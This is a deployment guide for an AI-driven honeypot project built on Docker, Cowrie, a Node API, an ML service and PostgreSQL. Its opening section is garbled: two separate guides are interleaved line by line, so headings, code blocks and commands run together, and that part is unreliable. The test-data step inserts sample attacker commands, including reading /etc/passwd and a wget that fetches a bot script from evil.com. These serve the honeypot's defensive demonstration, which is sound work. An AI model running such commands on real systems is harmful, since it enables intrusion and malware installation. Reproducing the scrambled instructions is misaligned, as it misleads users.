# 🚀 COMPLETE DEPLOYMENT GUIDE# AI-HONEYNET Deployment Guide



## **Step-by-Step Instructions to Run the Entire Project**This guide details how to deploy the full AI-HONEYNET system in a production environment.



---## Architecture



## ⚡ **QUICK START (5 Minutes)**The system consists of 4 Docker containers:

1. **Frontend**: React dashboard (Port 3001/80)

```powershell2. **Backend**: Node.js API (Port 3000)

# 1. Navigate to project3. **ML Service**: Python Flask API (Port 8001)

cd d:\boda\AI-Honeynet\HoneyNet4. **Database**: PostgreSQL 15 (Port 5432)



# 2. Create config## Prerequisites

Copy-Item .env.example .env

- Docker & Docker Compose installed

# 3. Start with Docker (EASIEST)- 4GB+ RAM

docker-compose up -d- 10GB+ Disk Space



# 4. Wait 2 minutes, then access:## Deployment Steps

# Frontend: http://localhost:3001

# Backend API: http://localhost:3000/api### 1. Clone & Configure

# ML Service: http://localhost:8001/health

``````bash

git clone <repository-url>

**Done! Your honeynet is running. Continue reading for details.**cd HoneyNet

cp .env.example .env

---```



## 📋 **PREREQUISITES**Edit `.env` with secure passwords and configuration:

```ini

### **Required:**DB_PASSWORD=your_secure_password

- ✅ Docker Desktop - https://www.docker.com/products/docker-desktop/JWT_SECRET=your_random_secret

- ✅ That's it! (Node.js, PostgreSQL, Python all in containers)```



### **Verify Docker:**### 2. Build & Start

```powershell

docker --version```bash

docker-compose --versiondocker compose build

```docker compose up -d

```

---

### 3. Verify Deployment

## 📖 **DETAILED WALKTHROUGH**

Check service health:

### **STEP 1: Configuration (2 minutes)**```bash

docker compose ps

```powershell```

# Navigate to projectAll services should be `healthy` or `running`.

cd d:\boda\AI-Honeynet\HoneyNet

### 4. Access Dashboard

# Copy environment template

Copy-Item .env.example .envOpen `http://localhost:3001` (or your server IP) in a browser.



# Edit configuration## Production Considerations

notepad .env

```### Security

- **Firewall**: Restrict access to ports 3000, 5432, and 8001. Only expose 3001 (Frontend) and SSH (for management).

**Minimal working config (paste this in .env):**- **SSL/TLS**: Use a reverse proxy (Nginx/Traefik) to serve the frontend over HTTPS.

```bash- **Passwords**: Change all default passwords in `docker-compose.yml` and `.env`.

# Database

DATABASE_URL=postgresql://honeynet:honeynet123@database:5432/honeynet### Data Persistence

DB_HOST=database- Database data is persisted in the `postgres-data` Docker volume.

DB_PORT=5432- To back up:

DB_NAME=honeynet  ```bash

DB_USER=honeynet  docker run --rm -v honeynet_postgres-data:/volume -v $(pwd):/backup alpine tar -czf /backup/db_backup.tar.gz /volume

DB_PASSWORD=honeynet123  ```



# Server### Scaling

PORT=3000- The **ML Service** can be scaled horizontally if load increases.

NODE_ENV=production- The **Backend** is stateless and can also be scaled.



# ML Service## Troubleshooting

ML_SERVICE_URL=http://ml-service:8001

**Logs**:

# Cowrie (use mock data for now)```bash

COWRIE_LOG_PATH=./mock-data/cowrie.jsondocker compose logs -f backend

COWRIE_DOWNLOADS_PATH=/tmp/cowrie/downloadsdocker compose logs -f ml-service

```

# Optional features (all FREE - disabled for now)

ENABLE_ALERTS=false**Database Connection Issues**:

ENABLE_REPUTATION_CHECK=false- Ensure `DB_HOST` is set to `database` (service name) in `.env`.

ENABLE_MALWARE_ANALYSIS=true- Check if PostgreSQL container is healthy.



# CORS**ML Service Issues**:

CORS_ORIGIN=http://localhost:3001- If models fail to load, ensure `train.py` ran successfully during build.

```- Check memory usage (`docker stats`).


**Save and close.**

---

### **STEP 2: Start with Docker (1 command)**

```powershell
# Start all services
docker-compose up -d

# Output:
# Creating network "honeynet_default"
# Creating honeynet_database_1 ... done
# Creating honeynet_ml-service_1 ... done  
# Creating honeynet_backend_1 ... done
# Creating honeynet_frontend_1 ... done
```

**Wait 2 minutes for services to initialize.**

---

### **STEP 3: Verify Everything Works**

```powershell
# Check all services are running
docker-compose ps

# Should show 4 services "Up"

# Test backend API
curl http://localhost:3000/api

# Test ML service
curl http://localhost:8001/health

# Open dashboard in browser
start http://localhost:3001
```

---

### **STEP 4: Initialize Database**

The database schema should auto-initialize, but if needed:

```powershell
# Access database
docker-compose exec database psql -U honeynet -d honeynet

# Inside psql, run:
\i /app/src/database/schema.sql
\i /app/src/database/migration_enhanced_features.sql

# Verify tables
\dt

# Exit
\q
```

**Or run from PowerShell:**
```powershell
docker-compose exec -T database psql -U honeynet -d honeynet < src/database/schema.sql
docker-compose exec -T database psql -U honeynet -d honeynet < src/database/migration_enhanced_features.sql
```

---

### **STEP 5: Add Test Data (Optional)**

```powershell
# Connect to database
docker-compose exec database psql -U honeynet -d honeynet
```

```sql
-- Insert test attacker
INSERT INTO attackers (id, ip_address, country, city, threat_level, total_events, first_seen, last_seen) 
VALUES (gen_random_uuid(), '45.142.212.61', 'Russia', 'Moscow', 'HIGH', 25, NOW() - INTERVAL '1 day', NOW());

-- Insert test events
INSERT INTO events (id, source_ip, timestamp, event_type, command, severity, anomaly_score) VALUES 
(gen_random_uuid(), '45.142.212.61', NOW() - INTERVAL '30 minutes', 'login', 'root:password123', 'HIGH', 0.91),
(gen_random_uuid(), '45.142.212.61', NOW() - INTERVAL '25 minutes', 'command', 'cat /etc/passwd', 'HIGH', 0.87),
(gen_random_uuid(), '45.142.212.61', NOW() - INTERVAL '20 minutes', 'command', 'wget http://evil.com/bot.sh', 'HIGH', 0.95);

\q
```

**Refresh dashboard - you should now see data!**

---

## 🎯 **ACCESSING THE SYSTEM**

### **Frontend Dashboard**
```
http://localhost:3001
```
- Real-time attack monitoring
- Geographic map
- Statistics & charts
- Event timeline

### **Backend API**
```
http://localhost:3000/api
```

**Key Endpoints:**
```powershell
# Stats & Events
curl http://localhost:3000/api/stats
curl http://localhost:3000/api/events
curl http://localhost:3000/api/attackers

# Analytics (8 endpoints)
curl http://localhost:3000/api/analytics/geo-distribution
curl http://localhost:3000/api/analytics/attack-phases
curl http://localhost:3000/api/analytics/campaigns

# Malware Analysis
curl http://localhost:3000/api/malware/stats/summary

# Export Threat Intelligence
curl "http://localhost:3000/api/export/stix?hours=24" > intel.json
curl "http://localhost:3000/api/export/misp?hours=24" > misp.json
curl "http://localhost:3000/api/export/csv?hours=168" > iocs.csv
```

### **ML Service**
```
http://localhost:8001/health
http://localhost:8001/docs  (FastAPI Swagger UI)
```

---

## 🔧 **COMMON OPERATIONS**

### **View Logs**
```powershell
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f backend
docker-compose logs backend | Select-String "HIGH"
```

### **Restart Services**
```powershell
# Restart all
docker-compose restart

# Restart specific
docker-compose restart backend
```

### **Stop Everything**
```powershell
docker-compose down

# Stop and remove volumes (full reset)
docker-compose down -v
```

### **Update After Code Changes**
```powershell
# Rebuild and restart
docker-compose up -d --build

# Rebuild specific service
docker-compose up -d --build backend
```

---

## 🆓 **OPTIONAL: ADD FREE API KEYS**

All features work without API keys, but you can enhance them:

### **1. AbuseIPDB (IP Reputation)**
```
1. Sign up: https://www.abuseipdb.com/register (FREE, no credit card)
2. Get API key from Account → API
3. Add to .env: ABUSEIPDB_API_KEY=your_key
4. Enable: ENABLE_REPUTATION_CHECK=true
5. Restart: docker-compose restart backend
```

### **2. VirusTotal (Malware Scanning)**
```
1. Sign up: https://www.virustotal.com/gui/join-us (FREE, no credit card)
2. Get API key from profile
3. Add to .env: VIRUSTOTAL_API_KEY=your_key
4. Restart: docker-compose restart backend
```

### **3. Slack Alerts**
```
1. Create webhook: https://api.slack.com/messaging/webhooks (FREE)
2. Add to .env: SLACK_WEBHOOK_URL=https://hooks.slack.com/...
3. Enable: ENABLE_ALERTS=true
4. Restart: docker-compose restart backend
```

### **4. Discord Alerts**
```
1. Server Settings → Integrations → Webhooks → New (FREE)
2. Add to .env: DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
3. Enable: ENABLE_ALERTS=true
4. Restart: docker-compose restart backend
```

**Total Cost: $0.00 (all free forever)**

---

## 🕷️ **OPTIONAL: CONNECT REAL COWRIE HONEYPOT**

For production use with real attack data:

### **Option A: Install Cowrie Separately**
```bash
# On separate VM/server
git clone https://github.com/cowrie/cowrie
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# Configure
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# Enable JSON logging in etc/cowrie.cfg:
[output_jsonlog]
enabled = true
logfile = var/log/cowrie/cowrie.json

# Start
bin/cowrie start
```

**Update .env to point to Cowrie logs:**
```bash
COWRIE_LOG_PATH=/path/to/cowrie/var/log/cowrie/cowrie.json
COWRIE_DOWNLOADS_PATH=/path/to/cowrie/var/lib/cowrie/downloads
```

**Restart backend:**
```powershell
docker-compose restart backend
```

### **Option B: Use Mock Data (Testing)**
```bash
# Already configured in .env.example
COWRIE_LOG_PATH=./mock-data/cowrie.json

# System will process mock events for testing
```

---

## 🐛 **TROUBLESHOOTING**

### **Services won't start**
```powershell
# Check port conflicts
netstat -ano | findstr :3000
netstat -ano | findstr :3001
netstat -ano | findstr :5432
netstat -ano | findstr :8001

# Kill conflicting processes or change ports in .env
```

### **Database connection errors**
```powershell
# Restart database
docker-compose restart database

# Check logs
docker-compose logs database

# Verify credentials in .env match docker-compose.yml
```

### **"Cannot find module" errors**
```powershell
# Rebuild containers
docker-compose up -d --build

# Force recreate
docker-compose up -d --force-recreate
```

### **Frontend shows no data**
```powershell
# Check backend is running
curl http://localhost:3000/api/stats

# Check CORS in .env
CORS_ORIGIN=http://localhost:3001

# Add test data (see Step 5)
```

### **ML Service not loading**
```powershell
# Check model files exist
docker-compose exec ml-service ls -la model/

# Check logs
docker-compose logs ml-service

# Rebuild ML service
docker-compose up -d --build ml-service
```

---

## 📊 **MONITORING & MAINTENANCE**

### **Check System Health**
```powershell
# Service status
docker-compose ps

# Resource usage
docker stats

# Disk usage
docker system df
```

### **Backup Database**
```powershell
# Backup
docker-compose exec -T database pg_dump -U honeynet honeynet > backup_$(Get-Date -Format "yyyyMMdd").sql

# Restore
docker-compose exec -T database psql -U honeynet -d honeynet < backup_20251129.sql
```

### **Clear Old Data**
```sql
-- Delete events older than 30 days
DELETE FROM events WHERE timestamp < NOW() - INTERVAL '30 days';

-- Vacuum database
VACUUM ANALYZE;
```

---

## ✅ **SUCCESS CHECKLIST**

Your system is working if:

- ✅ `docker-compose ps` shows 4 services "Up"
- ✅ `curl http://localhost:3000/api` returns JSON
- ✅ `curl http://localhost:8001/health` returns "healthy"
- ✅ `http://localhost:3001` shows dashboard
- ✅ Backend logs show "Server running on port 3000"
- ✅ Backend logs show "💰 COST GUARANTEE: ALL APIS ARE 100% FREE"
- ✅ Database has 6 tables (events, sessions, attackers, adaptations, attack_campaigns, malware_analysis)

---

## 🎉 **YOU'RE RUNNING!**

Your AI-powered honeynet now provides:

- 🤖 **ML Anomaly Detection** - Dual model ensemble (Isolation Forest + Autoencoder)
- 🗺️ **GeoIP Tracking** - Real-time attacker location mapping
- ⚔️ **MITRE ATT&CK** - Command classification into 11 attack phases
- 🕵️ **Campaign Detection** - Coordinated attack correlation (4 methods)
- 🦠 **Malware Analysis** - Automated file analysis + VirusTotal
- 📤 **Threat Export** - STIX 2.1, MISP, CSV formats
- 🚨 **Real-time Alerts** - Slack/Discord notifications
- 📊 **Advanced Analytics** - 8 intelligence endpoints
- 💾 **Complete Database** - All events, sessions, attackers tracked

**Total Cost: $0.00/month (100% free forever)**

---

## 📚 **NEXT STEPS**

1. **Monitor Dashboard:** http://localhost:3001
2. **Review Logs:** `docker-compose logs -f backend`
3. **Add Test Data:** See Step 5
4. **Connect Cowrie:** For real attack data
5. **Add API Keys:** Optional free enhancements
6. **Export Intel:** `curl http://localhost:3000/api/export/stix > intel.json`
7. **Share IOCs:** Contribute to security community

---

## 📖 **DOCUMENTATION**

- `API_SAFETY_GUARANTEE.md` - Proof all APIs are free
- `FEATURES_COMPLETE.md` - Complete feature documentation
- `IMPLEMENTATION_SUMMARY.md` - Technical details
- `ERRORS_RESOLVED.md` - Recent fixes
- `README.md` - Project overview

---

## 💡 **TIPS**

- **Development:** Use `docker-compose logs -f` to watch real-time logs
- **Testing:** Add mock data to see features in action
- **Production:** Connect real Cowrie honeypot for attack data
- **Sharing:** Export STIX bundles to share with security community
- **Monitoring:** Set up Slack/Discord for instant attack notifications
- **Cost:** Always $0.00 - all APIs are permanently free

**Need help? Check logs first: `docker-compose logs backend`**

---

**🚀 Enjoy your enterprise-grade AI honeypot!**
